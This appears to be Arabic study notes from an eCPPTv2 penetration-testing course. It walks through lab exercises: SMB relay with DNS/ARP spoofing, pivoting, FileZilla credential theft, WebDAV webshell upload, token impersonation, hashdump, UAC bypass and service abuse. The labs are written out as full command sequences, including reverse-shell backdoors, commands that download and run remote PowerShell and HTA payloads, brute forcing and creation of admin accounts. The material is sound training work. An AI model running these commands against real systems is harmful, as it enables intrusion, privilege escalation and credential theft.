# Session 7 (eCPPTv2) - Day 7  
## Penetration Testing: Network Security  

السلام عليكم ورحمة الله وبركاته  

اليوم باذن الله راح نكمل من الي وقفنا عليه امس  

---

معنا اليوم باذن الله اول لاب  

DNS and SMB Relay Attack
------------------------|  

طبعا هجوم الـ Relay نفس الطريقة والفكره لكن الفرق اي بروتوكول تستغل فقط  

You are hired by a small company to perform a security assessment. Your customer is sportsfoo.com and they want your help to test the security of their environment, according to the scope below:

The assumptions of this security engagement are:

You are going to do an internal penetration test, where you will be connected directly into their LAN network 172.16.5.0/24. The scope in this test is only the 172.16.5.0/24 segment

You are in a production network, so you should not lock any user account by guessing their usernames and passwords

The following image represents the LAB environment:

(LAB_environment)[https://ibb.co/PQWwsKq]  

طبعا نقدر نستغل عن طريق الـ MSFconsole  
```bash
msfconsole  
use exploit/windows/smb/smb_relay  
set SRVHOST 172.16.5.101  
set PAYLOAD windows/meterpreter/reverse_tcp  
set LHOST 172.16.5.101  
set SMBHOST 172.16.5.10  
exploit  
```  

طيب الان شغال السيرفر فيه الجوبز و نقدر نتاكد عن طريق كتابة الامر  
```bash
jobs  
```  

الان بنشغل الاداة الثانيه حقت الـ DNS spoofing  
```bash
echo "172.16.5.101 *.sportsfoo.com" > dns [to add the ip and the domain into file name dns]  
dnsspoof -i eth1 -f dns  
```  

Activate the MiTM attack using the ARP Spoofing technique.
Our goal is to poison the traffic between our victim, Windows 7 at 172.16.5.5 , and the default gateway at 172.16.5.1 . In this way, we can manipulate the traffic using dnsspoof , which is already running. In order to perform an ARP Spoofing  
attack, we need to enable the IP forwarding as follow:  
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward  
```  

In two separate terminals, start the ARP Spoof attack against 172.16.5.5 and 172.16.5.1 using these commands:
Commands:
```bash
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1  
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5  
```  
طبعا اول وحده كانت من التارقت للقيت واي  
اما الثانيه فالعكس من القيت واي الى التارقت  
ف اي شي راح يمر مابينهم لابد يمر من عند الاتاكر اول وبعدها الاتاكر يسوي له Forward  

الان نشوف ان الكلاينت الي نهايته 5.5 اي شي يرسله راح يجي الاتاكر اول وبعدها ينرسل للقيت واي والقيت واي او الراوتر يرسل الى الفايل سيرفر وبعدها الفايل سيرفر يرد على الراوتر او على القيت واي والقيت واي راح يرسل للاتاكر الرد مش للكلاينت والاتاكر يرسله للكلاينت بكذا اي شي يطلع من الكلاينت للراوتر لابد يمر من الاتاكر اولا وكذالك العكس اي شي طالع من الراوتر الى الكلاينت لابد يمر من عند الاتاكر اول  

نشوف الان انه اخذنا meterpreter session في الـ MSFconsole  
ومعنا اعلى صلاحيات  

الى هنا انتهى اللاب نشوف الي بعده  

---  

Post-Exploitation
------------------|  
طبعا اخذنا فكرة عن مابعد الاستغلال في كورس الـ PTS  
ف اي شي اخذناه سابقا راح نتركه بنشوف الاشياء الجديده يعني نمر عليه مرور الكرام  

اول شي خلونا نسوي بنق نشوف هل نقدر نوصل او لا  
```bash
ping demo.ine.local  
ping demo1.ine.local  
```  

طبعا نشوف انه الاول فيه رد الثاني مافيه ممكن يكون شبكة داخليه خلونا نفحص الاول بما انه نقدر نوصله  
```bash
nmap -sC -sV  demo.ine.local  
```  

نشوف طبعا انه عطانا بورتات كثيره مفتوحه  
طبعا بورت 80 نلاحظ انه فيه خدمة سبق واستغليناها الي هي HTTPFileServer راح نستغلها فورا  
```bash
msfconsole -q  
use exploit/windows/http/rejetto_hfs_exec  
show options  
set RHOSTS demo.ine.local  
exploit  
sysinfo  
getuid  
```  
نشوف انه تم الاستغلال ومعنا يوزر Administrator  
خلونا نحاول نرقي صلاحيتنا الى NT AUTHORITY\SYSTEM  
```bash
getsystem  
getuid  
```  
نشوف انه فعلا قدرنا نرفع الصلاحيات واخذنا اعلى صلاحيات في النظام  

خلونا الان نرجع لدومين الثاني الي ماقدرنا نوصله ونحاول نسوي بنق من الجهاز الي اخترقناه  
```bash
shell  
ping 10.0.21.170  
```  
نشوف انه فعلا عندنا اتصال الان خلونا نسوي Pivoting  
اول شي بنخلي السيشن بالخلفيه ونضيف ايبي الشبكة الى الراوت تيبل  
```bash
CTRL + C  
y  
run autoroute -s 10.0.21.170/20  
```  
نشوف انه فعلا تم اضافة الشبكة الى الراوت تيبل بدون اي مشاكل  

خلونا نركز على هدف اللاب وهو انه نستخدم بعض الموديولز الي تفيدنا بعد الاستغلال  

معنا اول موديول اليوم الي هو  
```bash
run post/windows/gather/enum_applications  
```
وظيفة هذا الموديول يعطيك كل البرامج المثبته على الجهاز  
نشوف انه عطانا اكثر من برنامج مثبت على التارقت  
نشوف انه حصلنا محمل برنامج FileZilla Client 3.57.0 ولما بحثنا شوي عرفنا انه فيه موديول يخص هذا البرنامج بالتحديد  

الموديول الثاني وظيفته يعطيك اليوزر والباسورد حق FTP عن طريق FileZilla  
```bash
run post/multi/gather/filezilla_client_cred  
```  
نشوف انه عطانا اليوزر بس الباسورد ماهو واضح او مفهوم  
طبعا الموديول يحفظ المخرجات بشكل xml ويحفظه لنا ف نقدر نقرا الملف خلونا نجرب ممكن الباسورد هناك واضح  
طبعا هو حفظه لنا على جهاز التارقت بمسار معين عطانا اياه اول ماشغلنا الموديول  
```bash
cat C:\\Users\\Administrator\\AppData\\Roaming\\FileZilla\\sitemanager.xml  
```  
وزي ماقلنا سابقا نخلي دبل باك سلاش لانه لو نحط واحد راح يعتبره سكيب  
ونشوف الان انه فعلا عندنا باسورد نقدر نقراه وواضح والان نقدر ندخل بالـ FTP  

الان خلونا نرجع لفكرة البفتنق  
طبعا حنا اضفنا الشبكة في الراوت تيبل  
خلونا نشوف سيرفر الـ proxychains  
```bash
cat /etc/proxychains4.conf  
```  
نشوف انه على بورت 9050 واصداره 4  
خلونا نرجع للميتاسبلويت ونشغل السيرفر  
```bash
background  
use auxiliary/server/socks_proxy  
show options  
set SRVPORT 9050  
set VERSION 4a   
exploit  
jobs  
```  
طيب حلو الان شغال السيرفر بالجوبز خلونا الان نسوي nmap scan  
```bash
proxychains nmap demo1.ine.local -sT -Pn -p 1-50  
```  
نشوف انه بورت 22و21 مفتوحه  

طبعا حنا نعرف انه في الدومين الاول شغال عليه بورت 3389 ف خلونا نسوي يوزر جديد على النظام ونحاول ندخل بالـ RDP  
```bash
sessions -i 1  
shell  
net user guest_1 guestpwd /add  
net localgroup "Remote Desktop Users" guest_1 /add  
net user  
```  
نشوف انه تم اضافة اليوزر خلونا نجرب الان ندخل عن طريق الـ RDP  
```bash
xfreerdp /u:guest_1 /p:guestpwd /v:demo.ine.local  
y  
```  
الان دخلنا تمام خلونا نشوف وين برنامج FileZilla  
طبعا هذا البرنامج يستخدم بروتوكول FTP عشان ينقل الملفات  
طيب الان حصلنا البرنامج نلاحظ فوق انه طالب منا Host , Username , Password , Port وهذي كلها معنا  
```bash
Host: 10.0.21.78  
Username: admin  
Password: FTPStrongPwd  
Port: 21  
```  
الان نسوي Quickconnect  
نشوف انه تم الاتصال وحصلنا على السيرفر ملف اسمه username.txt  
طيب خلونا نحمل الملف ونقرا المحتوى  
نشوف انه حصلنا 3 يوزرت  
```bash
administrator  
sysadmin  
student  
```  
طبعا راح ناخذ اقوى يوزر عندنا والي هو administrator  
خلونا نرجع للميتاسبلويت الان ونسوي portforward  
```bash
CTRL + C  
y  
portfwd add -l 1234 -p 22 -r 10.0.21.78  
portfwd list  
```  
حلو الان خلونا نفحص بورت 1234 على اللوكال عن طريق الـ nmap  
```bash
nmap -sV -p 1234 localhost  
```  
حلو الان خلونا نسوي بروت فورس على يوزر administrator عشان نحاول نتصل بالـ SSH  
```bash
proxychains hydra -l administrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo1.ine.local ssh  
```  
نشوف انه حصلنا اليوزر والباسورد الي هو password1  
خلونا الان نجرب نتصل بالـ SSH عن طريق MSFconsole  
```bash
background  
use auxiliary/scanner/ssh/ssh_login  
show options  
set RHOSTS demo1.ine.local  
set USERNAME administrator  
set PASSWORD password1  
set gatherproof false  
exploit  
sessions  
```  
نشوف انه عطانا سيشن جديده الان واخذنا شيل على التارقت الثاني الي ماكان عندنا وصول له  
مطلوب الان نقرا الفلاق الي بالجهاز الي سوينا له بفتنق  
```bash
sessions -i 2  
dir C:\  
type C:\FLAG1.txt  
```  
ونشوف انه قرا الفلاق والوضع تمام  
الى هنا انتهى اللاب نشوف الي بعده  

---  


Blind Penetration Test
-----------------------|  

طيب بداية خل نشوف فيه اتصال بيننا وبين التارقت او لا  
```bash
ping demo.ine.local  
```  
نشوف انه فيه اتصال خلونا نفحص التارقت  
```bash
nmap -sV -sC demo.ine.local  
```  
طيب حصلنا بورت 80 مفتوح خلونا نشوف نفتح البراوزر  
طبعا حلو نقدر نبحث عن cve او انه نشوف نبحث عن مسارات  
خلونا نمشي مع اللاب ونشوف المسارات  
```bash
dirb http://demo.ine.local  
```  
نشوف انه حصلنا مسار /webdav  
طيب حنا نعرف انه مصاب الـ webdav خلونا نستغله فورا  
```bash
davtest -url http://demo.ine.local/webdav  
```  
نشوف انه ماعطانا وش الملفات الي نقدر نرفعها لانه مطلوب يوزر وباسورد  
خلونا نسوي بروت فورس ونحاول نطلعهم عندنا طريقتين ياعن طريق هايدرا او عن طريق ميتاسبلويت  
```bash
msfconsole -q
use auxiliary/scanner/http/http_login  
set RHOSTS demo.ine.local  
set AUTH_URI /webdav/  
set USER_FILE  /usr/share/metasploit-framework/data/wordlists/common_users.txt  
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  
set VERBOSE false  
exploit  
```  
نشوف انه حصلنا اليوزر والباسورد  
```bash
bob:sunshine  
administrator:tigger  
```  
طيب حلو خلونا نرجع نشوف وش نقدر نرفع عن طريق davtest  
```bash
davtest -auth administrator:tigger  -url http://demo.ine.local/webdav  
```  
نشوف انه قالنا انه نقدر نرفع ملفات بالامتدادات التاليه txt , html . asp  
خلونا نسجل دخول عن طريق اداة cadaver  
```bash
cadaver http://demo.ine.local/webdav  
Username: administrator  
Password: tigger  
ls  
```  

طبعا خلونا الان نرفع ويب شيل  
```bash
put /usr/share/webshells/asp/webshell.asp  
```  
الان نرجع الموقع وندخل مسار webdav ونسجل دخول  
الان حصلنا الويب شيل نضغط عليه ونقدر ننفذ اي كوماند نبيه  
```bash
whoami  
dir  
```  

طيب الان نبي ناخذ meterpreter session عشان نقدر نسوي اشياء اكثر مثل البفتنق وغيرها  

خلونا الان نسوي لنا ملف backdoor ونرفع بامر PUT  
```bash
ip addr [to identify your ip]  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$attacker_ip LPORT=$attacker_port -f exe > backdoor.exe  
file backdoor.exe  
```  
الان سوينا الباك دور حقنا خلونا نرفعه عن طريق cadaver  
```bash
put /root/backdoor.exe  
```  
الان رفعنا الباك دور  
خلونا نرجع للموقع وندخل على مسار webdav ونسوي login  
وندخل على الويب شيل  
وننفذ هذا الامر الان  
```bash
dir C:\  
```  
حصلنا الفلاق الان خلونا نقرا الفلاق  
```bash
type c:\flag.txt  
```  
حلو الان خلونا ناخذ meterpreter session  
اول شي نفتح الليسنر  
```bash
use exploit/multi/handler  
set LHOST 10.10.15.6  
set LPORT 4444  
set PAYLOAD windows/meterpreter/reverse_tcp  
exploit   
```  
الان خلونا نرجع للموقع وندور وين ملف الباك دور الي رفعناه  
خلونا نشغل الان الملف بعد ماحصلنا الملف  
```bash
C:\inetpub\wwwroot\webdav\backdoor.exe  
```  
نشوف انه فتح لنا الباك دور الان ولو نرجع للميتاسبلويت بنحصل السيشن جتنا  
خلونا ننفذ بعض الاوامر  
```bash
sysinfo  
getuid  
```  
خلونا نحاول الان نرقي صلاحيتنا لانه مامعنا اعلى صلاحيات  

خلونا نجرب اول نرفعها عن طريق الميتاسبلويت  
```bash
getsystem  
```  
طيب نشوف انه رفض خلونا الان نبدا بمرحلة الـ privileges esc  
اول  شي خل نفتح شيل ونشوف صلاحياتنا  
```bash
shell  
whoami /all  
```  
نشوف انه الان معنا صلاحية SeImpersonatePrivilege  
وهذا يعتبر misconfigruation  
خلونا الان نستغله  
اول شي نطلع من الشيل ونغير الى بروسس اخر  
```bash
CTRL + C  
migrate -N w3wp.exe  
```  
طبعا هذا البروسس جاي من اللاب ولا المفروض تحول لأي بروسس مستقره مثل explorer.exe  
الان خلونا نسوي load لبلقن معين راح يساعدنا بالاستغلال  
```bash
load incognito  
```  
طيب خلونا نشوف وش اوامر البلقن هذا وكيف بنشوف كل التوكنز الي عندنا  
```bash
help  
list_tokens -u  
```  
نشوف انه عطانا 3 راح نختار الاعلى صلاحيات والي هو Administrator  
خلونا الان ننتحل هذا التوكن  
```bash
impersonate_token DOTNETGOAT\\Administrator  
```  
طبعا لابد تخليه دبل باك سلاش عشان مايعتبره سكيب  
خلونا الان نشوف وش اليوزر الي معنا  
```bash
getuid  
```  
نشوف انه معنا الان Administartor  

خلونا نسوي hashdump  
```bash
hashdump  
```  
طيب ليه اخذنا الهاش وحنا معنا اعلى صلاحيات؟  
كله عشان الـ presistence  
لانه حنا دخلنا عن طريق الويب شيل او الباك دور ممكن يحصله التارقت ويحذفه ويكون مانقدر ندخل  
عشان كذا نكسر الهاش ولو حصل الباك دور وحذفه مثلا او حذف الويب شيل عندنا طريقه انه ندخل عن طريق اليوزر والباسورد الي طلعناه يوم كسرنا الهاش  


الى هنا انتهى اللاب خل نشوف الي بعده  

---  

Privilege Escalation
---------------------|

اولا خلونا نشوف هل فيه اتصال بيننا وبين التارقت او لا  
```bash
ping demo.ine.local  
```  
نشوف انه عندنا اتصال خلونا نفحص التارقت  
```bash
nmap -sV -sC demo.ine.local  
```  
نشوف انه حصلنا بورت 80 شغال عليه HTTPFileServer 2.3 ونعرف انه مصاب راح نستغله فورا بالميتاسبلويت  
```bash
msfconsole -q  
use exploit/windows/http/rejetto_hfs_exec  
show options  
set RHOSTS demo.ine.local  
exploit  
sysinfo  
getuid  
```  
نشوف انه اليوزر الي معنا admin الان لابد نسوي Privilege Escalation  
خلونا اول شي نروح لبروسس مستقر عشان مايقطع علينا الاتصال  
```bash
ps -S explorer.exe  
migrate 2716  
```  
حلو الان خلونا نحاول نرفع صلاحياتنا عن طريق الميتاسبلويت  
```bash
getsystem  
```  
طيب نشوف انه رفض خلونا الان نفتح الشيل ونشوف اليوزرات الي بقروب administrators    
```bash
shell  
net localgroup administrators
```  
نشوف انه حصلنا admin & Administrator  
وحنا طبعا يوزرنا admin  
بكذا نعرف انه نقدر نرفع صلاحياتنا عن طريق bypassing UAC  
خلونا اول شي نسوي باك دور  
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.2 LPORT=4444 -f exe > 'backdoor.exe'  
```  
طبعا الان راح نروح لمسار الـ Temp ونرفع ملفاتنا هناك  
```bash
CTRL + C
cd C:\\Users\\admin\\AppData\\Local\\Temp  
upload /root/Desktop/tools/UACME/Akagi64.exe .  
upload /root/backdoor.exe .  
ls  
```  
نشوف انه الان رفعنا الملفات الي نحتاجها الي هي backdoor , akagi64 في مسار Temp  
خلونا الان نفتح الليسنر قبل نستغل  
```bash
msfconsole -q  
use exploit/multi/handler  
set PAYLOAD windows/meterpreter/reverse_tcp  
set LHOST 10.10.15.2  
set LPORT 4444  
exploit  
```  
حلو الان خلونا نحاول نرفع صلاحياتنا  
```bash
shell  
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe  
```  
23 هذا يعني انه راح نستخدم الطريقة الي رقمها 23 ف اذا حاب تقرا عن باقي الطرق المتوفره  
(UAC_Bypassing)[https://github.com/hfiref0x/UACME]  

حلو الان نرجع للميتاسبلويت ونشيك على الليسنر حقنا ونحصل انه فعلا جانا سيشن  
خلونا الان نحاول نرفع صلاحياتنا  
```bash
getsystem  
getuid  
```  
والان نشوف انه تم رفع صلاحياتنا وصرنا NT AUTHORITY\SYSTEM  
طبعا فيه طريقه ثانيه والي هي عن طريق موديول معين  

وظيفة الموديول انه يجمع معلومات عن التارقت بشكل عام وبعدها يعطيك افضل موديول تقدر تستغل فيه بدون اي مشاكل  
خلونا نفرض ان الان اخذنا meterpreter session وماعندنا كامل الصلاحيات وحابين نرفع صلاحياتنا  
```bash
run post/multi/recon/local_exploit_suggester  
```  
والان نشوف انه عطانا 2 موديولز تقريبا  
خلونا نجرب واحد منهم  
```bash
use exploit/windows/local/bypassuac_dotnet_profiler  
set SESSION 1  
exploit  
```  
نشوف انه عطانا سيشن 3 الان فتحها لنا خلونا نحاول نرفع الصلاحيات  
```bash
getsystem  
getuid  
```  
ونشوف انه رفع الصلاحيات بدون اي مشاكل  

فهذي طريقتين جدا راح تساعدك بخصوص رفع الصلاحيات او Privilege Escalation  

الى هنا انتهى اللاب  

خلونا نشوف اللاب الي بعده  

---  

Privilege Escalation Via Services
----------------------------------|  

طيب اول شي كلعاده نشيك على الاتصال بيننا وبين التارقت  
```bash
ping demo.ine.local
```  
نشوف انه فيه اتصال خلونا نفحص الان التارقت بالـ nmap  
```bash
nmap -sV -sC demo.ine.local  
```  
نشوف انه شغال بورت 80 وعليه الخدمة badblue 2.7  
خلونا نستغلها فورا  
```bash
msfconsole -q  
use exploit/windows/http/badblue_passthru  
show options  
set RHOSTS demo.ine.local  
exploit  
sysinfo  
getuid  
```  
الان استغلينا التارقت واخذنا الـ meterpreter session  
نشوف انه معنا يوزر WIN-I219UGQJ7H8\bob  
لابد الان نرفع صلاحياتنا خلونا اول شي نغير البروسس الي شغالينا عليه  
```bash
ps -S explorer.exe  
migrate 2736  
```  
طيب الان نحاول نرفع الصلاحيات  
```bash
getsystem  
```  
نشوف انه رفض  
طيب خلونا نشيك هل وش اليوزرات الي داخل قروب administrators  
```bash
shell  
net localgroup administrators  
```  
نشوف انه مافي يوزر bob فقط يوجد Administrator داخل administrators group  
طيب راح نرفع اداة اسمها powerup نفس سركبت linpeas الي في linux  
خلونا ننتقل لمسارها اولا ونفتح البايثون سيرفر وننقله  
```bash
cd /root/Desktop/tools/PowerSploit/Privesc/  
ls  
python -m SimpleHTTPServer 80  
```  
الان خلونا نرجع للميتاسبلويت ونطلع من الشيل ونسوي load للـ powershell  
```bash
CTRL + C  
load powershell  
```  
حلو الان خلونا نفتح الباورشيل  
```bash
powershell_shell  
```  
طيب حلو الان خلونا ننقل الملف من جهاز الاتاكر الى جهاز التارقت ف خلونا نشوف الامر التالي  
```bash
iex (New-Object Net.WebClient).DownloadString('http://10.10.15.3/PowerUp.ps1')  
```  
حلو الان خلونا نشغل السكربت هذا ونشوف وش ثغرات تصعيد الصلاحيات الي نقدر نستغلها  
```bash
Invoke-AllChecks  
```  
نشوف انه حصلنا يوزر bob وحصلنا الباسورد حقه  
وكذالك حصلنا سيرفس نقدر نستغلها اسمها AppReadiness  
طبعا عندنا طريقتين للاستغلال  
1. انه نسوي يوزر جديد على جهاز التارقت بصلاحيات administrator  
2. انه نضيف يوزر عندنا الى قروب الـ administrators  
خلونا نستغل الطريقة الثانيه  
```bash
Invoke-ServiceAbuse -Name AppReadiness -Command "net localgroup administrators bob /add"  
net localgroup administrators   
```  
وخلونا الان نجرب الطريقة الاولى ونسوي يوزر جديد ونضيفه بالقروب  
```bash
Invoke-ServiceAbuse -Name AppReadiness  -UserName ine -Password password_123 -LocalGroup "Administrators"  
net user  
```  
طبعا نقدر نشغل HTML Application (HTA) عشان ناخذ meterpreter session  
طبعا له موديول بالميتاسبلويت  
```bash
msfconsole -q  
use exploit/windows/misc/hta_server  
show options  
set LHOST 443  
exploit  
```  
الان نشوف انه عطانا الـ Local IP ومرفق فيها الرابط الي فيه ملف HTA  
خلونا الان نرجع للسيشن الي معنا وننفذ الامر التالي في الباورشيل عشان ناخذ meterprerte session باعلى صلاحيات  
```bash
Invoke-ServiceAbuse -Name AppReadiness  -Command "mshta.exe http://10.10.15.3:8080/ljUAsN.hta"  
```  
نشوف انه فتح لنا سيشن جديده خلونا ندخل ونشوف صلاحياتنا  
```bash
sessions -i 1  
getuid  
```  
ونشوف انه معنا اعلى صلاحيات والي هي NT AUTHORITY\SYSTEM  

الى هنا انتهينا باذن الله بكرا نكمل  

---  

## Follow us on:  
Twitter:  
[s4cript](https://twitter.com/s4cript)  
[cyberhub](https://twitter.com/cyberhub)  
[0xNawaF1](https://twitter.com/0xNawaF1)  
